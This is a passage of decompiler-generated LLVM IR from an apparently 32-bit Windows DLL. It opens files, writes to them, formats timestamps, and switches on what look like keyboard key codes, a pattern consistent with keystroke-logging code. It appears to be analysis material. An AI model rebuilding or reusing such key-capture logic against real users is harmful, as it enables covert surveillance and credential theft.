  %97 = inttoptr i32 %96 to i32*, !insn.addr !779
  store i32 2, i32* %97, align 4, !insn.addr !779
  %98 = add i32 %esp.1.reload, -60, !insn.addr !780
  %99 = inttoptr i32 %98 to i32*, !insn.addr !780
  store i32 ptrtoint (i32* @global_var_1003d9b4 to i32), i32* %99, align 4, !insn.addr !780
  %100 = add i32 %esp.1.reload, -64, !insn.addr !781
  %101 = inttoptr i32 %100 to i32*, !insn.addr !781
  store i32 %91, i32* %101, align 4, !insn.addr !781
  store i32 %91, i32* @global_var_1003d9b0, align 4, !insn.addr !782
  %102 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !783
  store i32 0, i32* @global_var_1003f508, align 4, !insn.addr !784
  store i32 %100, i32* %esp.2.reg2mem, !insn.addr !785
  br label %dec_label_pc_100024f8, !insn.addr !785

dec_label_pc_100024e4:                            ; preds = %dec_label_pc_100024a3
  store i32 4, i32* %81, align 4, !insn.addr !786
  %103 = add i32 %esp.1.reload, -32, !insn.addr !787
  %104 = inttoptr i32 %103 to i32*, !insn.addr !787
  store i32 0, i32* %104, align 4, !insn.addr !787
  %105 = add i32 %esp.1.reload, -36, !insn.addr !788
  %106 = inttoptr i32 %105 to i32*, !insn.addr !788
  store i32 1, i32* %106, align 4, !insn.addr !788
  %107 = add i32 %esp.1.reload, -40, !insn.addr !789
  %108 = inttoptr i32 %107 to i32*, !insn.addr !789
  store i32 4, i32* %108, align 4, !insn.addr !789
  %109 = add i32 %esp.1.reload, -44, !insn.addr !790
  %110 = inttoptr i32 %109 to i32*, !insn.addr !790
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %110, align 4, !insn.addr !790
  %111 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !791
  %112 = ptrtoint i32* %111 to i32, !insn.addr !791
  store i32 %112, i32* @global_var_1003d9b0, align 4, !insn.addr !792
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !792
  br label %dec_label_pc_100024f8, !insn.addr !792

dec_label_pc_100024f8:                            ; preds = %dec_label_pc_100024e4, %dec_label_pc_100024b3
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %113 = add i32 %esp.2.reload, -4, !insn.addr !793
  %114 = inttoptr i32 %113 to i32*, !insn.addr !793
  store i32 ptrtoint (i16* @global_var_1003ff18 to i32), i32* %114, align 4, !insn.addr !793
  call void @GetLocalTime(%_SYSTEMTIME* bitcast (i32* @1 to %_SYSTEMTIME*)), !insn.addr !794
  %115 = load i16, i16* @global_var_1003ff24, align 2, !insn.addr !795
  %116 = zext i16 %115 to i32, !insn.addr !795
  %117 = add i32 %esp.2.reload, -8, !insn.addr !796
  %118 = inttoptr i32 %117 to i32*, !insn.addr !796
  store i32 ptrtoint (i16** @global_var_1003f510 to i32), i32* %118, align 4, !insn.addr !796
  %119 = add i32 %esp.2.reload, -12, !insn.addr !797
  %120 = inttoptr i32 %119 to i32*, !insn.addr !797
  store i32 %116, i32* %120, align 4, !insn.addr !797
  %121 = load i16, i16* @global_var_1003ff22, align 2, !insn.addr !798
  %122 = zext i16 %121 to i32, !insn.addr !798
  %123 = add i32 %esp.2.reload, -16, !insn.addr !799
  %124 = inttoptr i32 %123 to i32*, !insn.addr !799
  store i32 %122, i32* %124, align 4, !insn.addr !799
  %125 = load i16, i16* @global_var_1003ff20, align 2, !insn.addr !800
  %126 = zext i16 %125 to i32, !insn.addr !800
  %127 = add i32 %esp.2.reload, -20, !insn.addr !801
  %128 = inttoptr i32 %127 to i32*, !insn.addr !801
  store i32 %126, i32* %128, align 4, !insn.addr !801
  %129 = load i16, i16* @global_var_1003ff1e, align 2, !insn.addr !802
  %130 = zext i16 %129 to i32, !insn.addr !802
  %131 = add i32 %esp.2.reload, -24, !insn.addr !803
  %132 = inttoptr i32 %131 to i32*, !insn.addr !803
  store i32 %130, i32* %132, align 4, !insn.addr !803
  %133 = load i16, i16* @global_var_1003ff1a, align 2, !insn.addr !804
  %134 = zext i16 %133 to i32, !insn.addr !804
  %135 = add i32 %esp.2.reload, -28, !insn.addr !805
  %136 = inttoptr i32 %135 to i32*, !insn.addr !805
  store i32 %134, i32* %136, align 4, !insn.addr !805
  %137 = load i16, i16* @global_var_1003ff18, align 2, !insn.addr !806
  %138 = zext i16 %137 to i32, !insn.addr !806
  %139 = add i32 %esp.2.reload, -32, !insn.addr !807
  %140 = inttoptr i32 %139 to i32*, !insn.addr !807
  store i32 %138, i32* %140, align 4, !insn.addr !807
  %141 = add i32 %esp.2.reload, -36, !insn.addr !808
  %142 = inttoptr i32 %141 to i32*, !insn.addr !808
  store i32 ptrtoint ([40 x i16]* @global_var_10039208 to i32), i32* %142, align 4, !insn.addr !808
  %143 = add i32 %esp.2.reload, -40, !insn.addr !809
  %144 = inttoptr i32 %143 to i32*, !insn.addr !809
  store i32 ptrtoint (i16** @global_var_1003ed08 to i32), i32* %144, align 4, !insn.addr !809
  %145 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !810
  store i32 ptrtoint (i16** @global_var_1003ed08 to i32), i32* %eax.2.reg2mem, !insn.addr !811
  br label %dec_label_pc_10002553, !insn.addr !811

dec_label_pc_10002553:                            ; preds = %dec_label_pc_10002553, %dec_label_pc_100024f8
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %146 = inttoptr i32 %eax.2.reload to i16*, !insn.addr !812
  %147 = load i16, i16* %146, align 2, !insn.addr !812
  %148 = add i32 %eax.2.reload, 2, !insn.addr !813
  %149 = icmp eq i16 %147, 0, !insn.addr !814
  %150 = icmp eq i1 %149, false, !insn.addr !815
  store i32 %148, i32* %eax.2.reg2mem, !insn.addr !815
  br i1 %150, label %dec_label_pc_10002553, label %dec_label_pc_1000255e, !insn.addr !815

dec_label_pc_1000255e:                            ; preds = %dec_label_pc_10002553
  %151 = sub i32 %148, ptrtoint (i32* @global_var_1003ed0a to i32), !insn.addr !816
  store i32 0, i32* %118, align 4, !insn.addr !817
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %120, align 4, !insn.addr !818
  store i32 %151, i32* %124, align 4, !insn.addr !819
  store i32 ptrtoint (i16** @global_var_1003ed08 to i32), i32* %128, align 4, !insn.addr !820
  %152 = load i32, i32* @global_var_1003d9b0, align 4, !insn.addr !821
  store i32 %152, i32* %132, align 4, !insn.addr !821
  %153 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !822
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !823
  br label %dec_label_pc_10002580, !insn.addr !823

dec_label_pc_10002580:                            ; preds = %dec_label_pc_10002580, %dec_label_pc_1000255e
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %154 = add i32 %ecx.3.reload, ptrtoint (i16** @global_var_1003f510 to i32), !insn.addr !824
  %155 = inttoptr i32 %154 to i16*, !insn.addr !824
  %156 = load i16, i16* %155, align 2, !insn.addr !824
  %157 = add i32 %ecx.3.reload, 2, !insn.addr !825
  %158 = add i32 %ecx.3.reload, 268697656, !insn.addr !826
  %159 = inttoptr i32 %158 to i16*, !insn.addr !826
  store i16 %156, i16* %159, align 2, !insn.addr !826
  %160 = icmp eq i16 %156, 0, !insn.addr !827
  %161 = icmp eq i1 %160, false, !insn.addr !828
  store i32 %157, i32* %ecx.3.reg2mem, !insn.addr !828
  br i1 %161, label %dec_label_pc_10002580, label %dec_label_pc_10002596, !insn.addr !828

dec_label_pc_10002596:                            ; preds = %dec_label_pc_10002580
  %162 = load i32, i32* @global_var_1003d9b0, align 4, !insn.addr !829
  store i32 %162, i32* %136, align 4, !insn.addr !829
  %163 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !830
  store i32 %135, i32* %esp.3.reg2mem, !insn.addr !830
  br label %dec_label_pc_1000259e, !insn.addr !830

dec_label_pc_1000259e:                            ; preds = %dec_label_pc_10002478, %dec_label_pc_10002487, %dec_label_pc_10002596, %dec_label_pc_10002439
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %164 = ptrtoint i16* %stack_var_-216.0.reload to i32
  store i32 %164, i32* @0, align 4, !insn.addr !831
  %165 = trunc i32 %164 to i16, !insn.addr !832
  %.off = add i16 %165, -39
  %166 = icmp ult i16 %.off, 52
  br i1 %166, label %dec_label_pc_10002def, label %dec_label_pc_100025b4, !insn.addr !832

dec_label_pc_100025b4:                            ; preds = %dec_label_pc_1000259e
  store i32 %164, i32* %.pre-phi.reg2mem, !insn.addr !833
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !833
  switch i32 %164, label %dec_label_pc_10002dcf [
    i32 0, label %dec_label_pc_10002af3
    i32 1, label %dec_label_pc_1000264d
    i32 2, label %dec_label_pc_100028ee
    i32 3, label %dec_label_pc_1000264d
    i32 4, label %dec_label_pc_100028ee
    i32 5, label %dec_label_pc_1000264d
    i32 6, label %dec_label_pc_100026a6
    i32 10, label %dec_label_pc_10002602
    i32 14, label %dec_label_pc_100026fb
    i32 15, label %dec_label_pc_10002d63
    i32 17, label %dec_label_pc_10002af3
    i32 29, label %dec_label_pc_100025d3
    i32 30, label %dec_label_pc_10002b4c
    i32 31, label %dec_label_pc_10002ba6
    i32 32, label %dec_label_pc_10002c06
    i32 33, label %dec_label_pc_10002c5b
    i32 43, label %dec_label_pc_10002756
    i32 88, label %dec_label_pc_10002cb6
    i32 89, label %dec_label_pc_10002d0b
    i32 93, label %dec_label_pc_10002890
    i32 94, label %dec_label_pc_100028bf
    i32 95, label %dec_label_pc_100028ee
    i32 96, label %dec_label_pc_1000291d
    i32 97, label %dec_label_pc_1000294c
    i32 98, label %dec_label_pc_1000297b
    i32 99, label %dec_label_pc_100029aa
    i32 100, label %dec_label_pc_100029d9
    i32 101, label %dec_label_pc_10002a08
    i32 102, label %dec_label_pc_10002a37
    i32 103, label %dec_label_pc_10002a66
    i32 104, label %dec_label_pc_10002814
    i32 106, label %dec_label_pc_10002852
    i32 107, label %dec_label_pc_10002a95
    i32 108, label %dec_label_pc_10002ac4
    i32 183, label %dec_label_pc_100027ab
    i32 184, label %dec_label_pc_10002814
    i32 185, label %dec_label_pc_10002843
    i32 186, label %dec_label_pc_10002852
    i32 187, label %dec_label_pc_10002881
    i32 188, label %dec_label_pc_100027ba
    i32 189, label %dec_label_pc_100027c9
  ], !insn.addr !833

dec_label_pc_100025d3:                            ; preds = %dec_label_pc_100025b4
  %167 = add i32 %esp.3.reload, -4, !insn.addr !834
  %168 = inttoptr i32 %167 to i32*, !insn.addr !834
  store i32 0, i32* %168, align 4, !insn.addr !834
  %169 = add i32 %esp.3.reload, -8, !insn.addr !835
  %170 = inttoptr i32 %169 to i32*, !insn.addr !835
  store i32 128, i32* %170, align 4, !insn.addr !835
  %171 = add i32 %esp.3.reload, -12, !insn.addr !836
  %172 = inttoptr i32 %171 to i32*, !insn.addr !836
  store i32 4, i32* %172, align 4, !insn.addr !836
  %173 = add i32 %esp.3.reload, -16, !insn.addr !837
  %174 = inttoptr i32 %173 to i32*, !insn.addr !837
  store i32 0, i32* %174, align 4, !insn.addr !837
  %175 = add i32 %esp.3.reload, -20, !insn.addr !838
  %176 = inttoptr i32 %175 to i32*, !insn.addr !838
  store i32 1, i32* %176, align 4, !insn.addr !838
  %177 = add i32 %esp.3.reload, -24, !insn.addr !839
  %178 = inttoptr i32 %177 to i32*, !insn.addr !839
  store i32 4, i32* %178, align 4, !insn.addr !839
  %179 = add i32 %esp.3.reload, -28, !insn.addr !840
  %180 = inttoptr i32 %179 to i32*, !insn.addr !840
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %180, align 4, !insn.addr !840
  %181 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !841
  %182 = ptrtoint i32* %181 to i32, !insn.addr !841
  %183 = add i32 %esp.3.reload, -32, !insn.addr !842
  %184 = inttoptr i32 %183 to i32*, !insn.addr !842
  store i32 0, i32* %184, align 4, !insn.addr !842
  %185 = add i32 %esp.3.reload, -36, !insn.addr !843
  %186 = inttoptr i32 %185 to i32*, !insn.addr !843
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %186, align 4, !insn.addr !843
  %187 = add i32 %esp.3.reload, -40, !insn.addr !844
  %188 = inttoptr i32 %187 to i32*, !insn.addr !844
  store i32 2, i32* %188, align 4, !insn.addr !844
  %189 = add i32 %esp.3.reload, -44, !insn.addr !845
  %190 = inttoptr i32 %189 to i32*, !insn.addr !845
  store i32 ptrtoint (i32* @global_var_10039258 to i32), i32* %190, align 4, !insn.addr !845
  store i32 %182, i32* @global_var_1003d9b0, align 4, !insn.addr !846
  %191 = add i32 %esp.3.reload, -48, !insn.addr !847
  %192 = inttoptr i32 %191 to i32*, !insn.addr !847
  store i32 %182, i32* %192, align 4, !insn.addr !847
  store i32 %191, i32* %esp.5.reg2mem, !insn.addr !848
  br label %dec_label_pc_10002dc5, !insn.addr !848

dec_label_pc_10002602:                            ; preds = %dec_label_pc_100025b4
  %193 = call i128 @__asm_movaps(i128 7368318247016640781110928015451), !insn.addr !849
  %194 = add i32 %esp.3.reload, -4, !insn.addr !850
  %195 = inttoptr i32 %194 to i32*, !insn.addr !850
  store i32 0, i32* %195, align 4, !insn.addr !850
  %196 = add i32 %esp.3.reload, -8, !insn.addr !851
  %197 = inttoptr i32 %196 to i32*, !insn.addr !851
  store i32 128, i32* %197, align 4, !insn.addr !851
  %198 = add i32 %esp.3.reload, -12, !insn.addr !852
  %199 = inttoptr i32 %198 to i32*, !insn.addr !852
  store i32 4, i32* %199, align 4, !insn.addr !852
  %200 = add i32 %esp.3.reload, -16, !insn.addr !853
  %201 = inttoptr i32 %200 to i32*, !insn.addr !853
  store i32 0, i32* %201, align 4, !insn.addr !853
  %202 = add i32 %esp.3.reload, -20, !insn.addr !854
  %203 = inttoptr i32 %202 to i32*, !insn.addr !854
  store i32 1, i32* %203, align 4, !insn.addr !854
  %204 = add i32 %esp.3.reload, -24, !insn.addr !855
  %205 = inttoptr i32 %204 to i32*, !insn.addr !855
  store i32 4, i32* %205, align 4, !insn.addr !855
  %206 = add i32 %esp.3.reload, -28, !insn.addr !856
  %207 = inttoptr i32 %206 to i32*, !insn.addr !856
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %207, align 4, !insn.addr !856
  %208 = load i128, i128* %stack_var_-108, align 8, !insn.addr !857
  call void @__asm_movups(i128 %208, i128 %193), !insn.addr !857
  %209 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !858
  %210 = ptrtoint i32* %209 to i32, !insn.addr !858
  store i32 %210, i32* @global_var_1003d9b0, align 4, !insn.addr !859
  store i32 %34, i32* %ecx.4.reg2mem, !insn.addr !860
  br label %dec_label_pc_10002637, !insn.addr !860

dec_label_pc_10002637:                            ; preds = %dec_label_pc_10002637, %dec_label_pc_10002602
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %211 = inttoptr i32 %ecx.4.reload to i16*, !insn.addr !861
  %212 = load i16, i16* %211, align 2, !insn.addr !861
  %213 = add i32 %ecx.4.reload, 2, !insn.addr !862
  %214 = icmp eq i16 %212, 0, !insn.addr !863
  %215 = icmp eq i1 %214, false, !insn.addr !864
  store i32 %213, i32* %ecx.4.reg2mem, !insn.addr !864
  store i32 %213, i32* %.pn.reg2mem, !insn.addr !864
  store i32 %210, i32* %edx.6.reg2mem, !insn.addr !864
  store i32 %206, i32* %esp.4.reg2mem, !insn.addr !864
  br i1 %215, label %dec_label_pc_10002637, label %dec_label_pc_10002db3, !insn.addr !864

dec_label_pc_1000264d:                            ; preds = %dec_label_pc_100025b4, %dec_label_pc_100025b4, %dec_label_pc_100025b4
  %216 = call i128 @__asm_movaps(i128 %38), !insn.addr !865
  %217 = add i32 %esp.3.reload, -4, !insn.addr !866
  %218 = inttoptr i32 %217 to i32*, !insn.addr !866
  store i32 0, i32* %218, align 4, !insn.addr !866
  %219 = add i32 %esp.3.reload, -8, !insn.addr !867
  %220 = inttoptr i32 %219 to i32*, !insn.addr !867
  store i32 128, i32* %220, align 4, !insn.addr !867
  %221 = add i32 %esp.3.reload, -12, !insn.addr !868
  %222 = inttoptr i32 %221 to i32*, !insn.addr !868
  store i32 4, i32* %222, align 4, !insn.addr !868
  %223 = add i32 %esp.3.reload, -16, !insn.addr !869
  %224 = inttoptr i32 %223 to i32*, !insn.addr !869
  store i32 0, i32* %224, align 4, !insn.addr !869
  %225 = add i32 %esp.3.reload, -20, !insn.addr !870
  %226 = inttoptr i32 %225 to i32*, !insn.addr !870
  store i32 1, i32* %226, align 4, !insn.addr !870
  %227 = add i32 %esp.3.reload, -24, !insn.addr !871
  %228 = inttoptr i32 %227 to i32*, !insn.addr !871
  store i32 4, i32* %228, align 4, !insn.addr !871
  %229 = add i32 %esp.3.reload, -28, !insn.addr !872
  %230 = inttoptr i32 %229 to i32*, !insn.addr !872
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %230, align 4, !insn.addr !872
  %231 = load i128, i128* %stack_var_-108, align 8, !insn.addr !873
  call void @__asm_movups(i128 %231, i128 %216), !insn.addr !873
  %232 = call i32* @CreateFileW(i16* inttoptr (i32 4522051 to i16*), i32 93, i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !874
  %233 = ptrtoint i32* %232 to i32, !insn.addr !874
  store i32 %233, i32* @global_var_1003d9b0, align 4, !insn.addr !875
  store i32 %34, i32* %ecx.5.reg2mem, !insn.addr !876
  br label %dec_label_pc_10002690, !insn.addr !876

dec_label_pc_10002690:                            ; preds = %dec_label_pc_10002690, %dec_label_pc_1000264d
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %234 = inttoptr i32 %ecx.5.reload to i16*, !insn.addr !877
  %235 = load i16, i16* %234, align 2, !insn.addr !877
  %236 = add i32 %ecx.5.reload, 2, !insn.addr !878
  %237 = icmp eq i16 %235, 0, !insn.addr !879
  %238 = icmp eq i1 %237, false, !insn.addr !880
  store i32 %236, i32* %ecx.5.reg2mem, !insn.addr !880
  store i32 %236, i32* %.pn.reg2mem, !insn.addr !880
  store i32 %233, i32* %edx.6.reg2mem, !insn.addr !880
  store i32 %229, i32* %esp.4.reg2mem, !insn.addr !880
  br i1 %238, label %dec_label_pc_10002690, label %dec_label_pc_10002db3, !insn.addr !880

dec_label_pc_100026a6:                            ; preds = %dec_label_pc_100025b4
  %239 = add i32 %esp.3.reload, -4, !insn.addr !881
  %240 = inttoptr i32 %239 to i32*, !insn.addr !881
  store i32 0, i32* %240, align 4, !insn.addr !881
  %241 = add i32 %esp.3.reload, -8, !insn.addr !882
  %242 = inttoptr i32 %241 to i32*, !insn.addr !882
  store i32 128, i32* %242, align 4, !insn.addr !882
  %243 = add i32 %esp.3.reload, -12, !insn.addr !883
  %244 = inttoptr i32 %243 to i32*, !insn.addr !883
  store i32 4, i32* %244, align 4, !insn.addr !883
  %245 = add i32 %esp.3.reload, -16, !insn.addr !884
  %246 = inttoptr i32 %245 to i32*, !insn.addr !884
  store i32 0, i32* %246, align 4, !insn.addr !884
  %247 = add i32 %esp.3.reload, -20, !insn.addr !885
  %248 = inttoptr i32 %247 to i32*, !insn.addr !885
  store i32 1, i32* %248, align 4, !insn.addr !885
  %249 = add i32 %esp.3.reload, -24, !insn.addr !886
  %250 = inttoptr i32 %249 to i32*, !insn.addr !886
  store i32 4, i32* %250, align 4, !insn.addr !886
  %251 = add i32 %esp.3.reload, -28, !insn.addr !887
  %252 = inttoptr i32 %251 to i32*, !insn.addr !887
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %252, align 4, !insn.addr !887
  store i128 5505115, i128* %stack_var_-108, align 8, !insn.addr !888
  %253 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !889
  %254 = ptrtoint i32* %253 to i32, !insn.addr !889
  store i32 %254, i32* @global_var_1003d9b0, align 4, !insn.addr !890
  store i32 %34, i32* %ecx.6.reg2mem, !insn.addr !891
  br label %dec_label_pc_100026e5, !insn.addr !891

dec_label_pc_100026e5:                            ; preds = %dec_label_pc_100026e5, %dec_label_pc_100026a6
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %255 = inttoptr i32 %ecx.6.reload to i16*, !insn.addr !892
  %256 = load i16, i16* %255, align 2, !insn.addr !892
  %257 = add i32 %ecx.6.reload, 2, !insn.addr !893
  %258 = icmp eq i16 %256, 0, !insn.addr !894
  %259 = icmp eq i1 %258, false, !insn.addr !895
  store i32 %257, i32* %ecx.6.reg2mem, !insn.addr !895
  store i32 %257, i32* %.pn.reg2mem, !insn.addr !895
  store i32 %254, i32* %edx.6.reg2mem, !insn.addr !895
  store i32 %251, i32* %esp.4.reg2mem, !insn.addr !895
  br i1 %259, label %dec_label_pc_100026e5, label %dec_label_pc_10002db3, !insn.addr !895

dec_label_pc_100026fb:                            ; preds = %dec_label_pc_100025b4
  %260 = add i32 %esp.3.reload, -4, !insn.addr !896
  %261 = inttoptr i32 %260 to i32*, !insn.addr !896
  store i32 0, i32* %261, align 4, !insn.addr !896
  %262 = add i32 %esp.3.reload, -8, !insn.addr !897
  %263 = inttoptr i32 %262 to i32*, !insn.addr !897
  store i32 128, i32* %263, align 4, !insn.addr !897
  %264 = add i32 %esp.3.reload, -12, !insn.addr !898
  %265 = inttoptr i32 %264 to i32*, !insn.addr !898
  store i32 4, i32* %265, align 4, !insn.addr !898
  %266 = add i32 %esp.3.reload, -16, !insn.addr !899
  %267 = inttoptr i32 %266 to i32*, !insn.addr !899
  store i32 0, i32* %267, align 4, !insn.addr !899
  %268 = add i32 %esp.3.reload, -20, !insn.addr !900
  %269 = inttoptr i32 %268 to i32*, !insn.addr !900
  store i32 1, i32* %269, align 4, !insn.addr !900
  %270 = add i32 %esp.3.reload, -24, !insn.addr !901
  %271 = inttoptr i32 %270 to i32*, !insn.addr !901
  store i32 4, i32* %271, align 4, !insn.addr !901
  %272 = add i32 %esp.3.reload, -28, !insn.addr !902
  %273 = inttoptr i32 %272 to i32*, !insn.addr !902
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %273, align 4, !insn.addr !902
  store i128 4391003, i128* %stack_var_-108, align 8, !insn.addr !903
  %274 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !904
  %275 = ptrtoint i32* %274 to i32, !insn.addr !904
  store i32 %275, i32* @global_var_1003d9b0, align 4, !insn.addr !905
  store i32 %34, i32* %ecx.7.reg2mem, !insn.addr !906
  br label %dec_label_pc_10002740, !insn.addr !906

dec_label_pc_10002740:                            ; preds = %dec_label_pc_10002740, %dec_label_pc_100026fb
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %276 = inttoptr i32 %ecx.7.reload to i16*, !insn.addr !907
  %277 = load i16, i16* %276, align 2, !insn.addr !907
  %278 = add i32 %ecx.7.reload, 2, !insn.addr !908
  %279 = icmp eq i16 %277, 0, !insn.addr !909
  %280 = icmp eq i1 %279, false, !insn.addr !910
  store i32 %278, i32* %ecx.7.reg2mem, !insn.addr !910
  store i32 %278, i32* %.pn.reg2mem, !insn.addr !910
  store i32 %275, i32* %edx.6.reg2mem, !insn.addr !910
  store i32 %272, i32* %esp.4.reg2mem, !insn.addr !910
  br i1 %280, label %dec_label_pc_10002740, label %dec_label_pc_10002db3, !insn.addr !910

dec_label_pc_10002756:                            ; preds = %dec_label_pc_100025b4
  %281 = add i32 %esp.3.reload, -4, !insn.addr !911
  %282 = inttoptr i32 %281 to i32*, !insn.addr !911
  store i32 0, i32* %282, align 4, !insn.addr !911
  %283 = add i32 %esp.3.reload, -8, !insn.addr !912
  %284 = inttoptr i32 %283 to i32*, !insn.addr !912
  store i32 128, i32* %284, align 4, !insn.addr !912
  %285 = add i32 %esp.3.reload, -12, !insn.addr !913
  %286 = inttoptr i32 %285 to i32*, !insn.addr !913
  store i32 4, i32* %286, align 4, !insn.addr !913
  %287 = add i32 %esp.3.reload, -16, !insn.addr !914
  %288 = inttoptr i32 %287 to i32*, !insn.addr !914
  store i32 0, i32* %288, align 4, !insn.addr !914
  %289 = add i32 %esp.3.reload, -20, !insn.addr !915
  %290 = inttoptr i32 %289 to i32*, !insn.addr !915
  store i32 1, i32* %290, align 4, !insn.addr !915
  %291 = add i32 %esp.3.reload, -24, !insn.addr !916
  %292 = inttoptr i32 %291 to i32*, !insn.addr !916
  store i32 4, i32* %292, align 4, !insn.addr !916
  %293 = add i32 %esp.3.reload, -28, !insn.addr !917
  %294 = inttoptr i32 %293 to i32*, !insn.addr !917
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %294, align 4, !insn.addr !917
  store i128 4456539, i128* %stack_var_-108, align 8, !insn.addr !918
  %295 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !919
  %296 = ptrtoint i32* %295 to i32, !insn.addr !919
  store i32 %296, i32* @global_var_1003d9b0, align 4, !insn.addr !920
  store i32 %34, i32* %ecx.8.reg2mem, !insn.addr !921
  br label %dec_label_pc_10002795, !insn.addr !921

dec_label_pc_10002795:                            ; preds = %dec_label_pc_10002795, %dec_label_pc_10002756
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %297 = inttoptr i32 %ecx.8.reload to i16*, !insn.addr !922
  %298 = load i16, i16* %297, align 2, !insn.addr !922
  %299 = add i32 %ecx.8.reload, 2, !insn.addr !923
  %300 = icmp eq i16 %298, 0, !insn.addr !924
  %301 = icmp eq i1 %300, false, !insn.addr !925
  store i32 %299, i32* %ecx.8.reg2mem, !insn.addr !925
  store i32 %299, i32* %.pn.reg2mem, !insn.addr !925
  store i32 %296, i32* %edx.6.reg2mem, !insn.addr !925
  store i32 %293, i32* %esp.4.reg2mem, !insn.addr !925
  br i1 %301, label %dec_label_pc_10002795, label %dec_label_pc_10002db3, !insn.addr !925

dec_label_pc_100027ab:                            ; preds = %dec_label_pc_100025b4
  %302 = call i32 @function_10001ff0(), !insn.addr !926
  store i32 183, i32* %.pre-phi.reg2mem, !insn.addr !927
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !927
  br label %dec_label_pc_10002dcf, !insn.addr !927

dec_label_pc_100027ba:                            ; preds = %dec_label_pc_100025b4
  %303 = call i32 @function_10001ff0(), !insn.addr !928
  store i32 188, i32* %.pre-phi.reg2mem, !insn.addr !929
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !929
  br label %dec_label_pc_10002dcf, !insn.addr !929

dec_label_pc_100027c9:                            ; preds = %dec_label_pc_100025b4
  %304 = call i32 @function_10001ff0(), !insn.addr !930
  store i32 189, i32* %.pre-phi.reg2mem, !insn.addr !931
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !931
  br label %dec_label_pc_10002dcf, !insn.addr !931

dec_label_pc_10002814:                            ; preds = %dec_label_pc_100025b4, %dec_label_pc_100025b4
  %305 = add i32 %esp.3.reload, -4, !insn.addr !932
  %306 = inttoptr i32 %305 to i32*, !insn.addr !932
  store i32 0, i32* %306, align 4, !insn.addr !932
  %307 = add i32 %esp.3.reload, -8, !insn.addr !933
  %308 = inttoptr i32 %307 to i32*, !insn.addr !933
  store i32 128, i32* %308, align 4, !insn.addr !933
  %309 = add i32 %esp.3.reload, -12, !insn.addr !934
  %310 = inttoptr i32 %309 to i32*, !insn.addr !934
  store i32 4, i32* %310, align 4, !insn.addr !934
  %311 = add i32 %esp.3.reload, -16, !insn.addr !935
  %312 = inttoptr i32 %311 to i32*, !insn.addr !935
  store i32 0, i32* %312, align 4, !insn.addr !935
